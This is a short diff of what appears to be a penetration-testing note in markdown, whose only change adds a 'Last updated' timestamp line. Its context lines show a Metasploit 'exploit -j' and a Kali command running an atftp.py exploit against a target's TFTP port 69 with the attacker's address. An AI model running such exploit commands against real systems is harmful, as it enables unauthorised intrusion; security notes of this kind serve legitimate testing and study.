@@ -98,3 +98,6 @@ exploit -j
 ```bash - kali
 python atftp.py $TARGET 69 $KALI $OS-VERSION
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
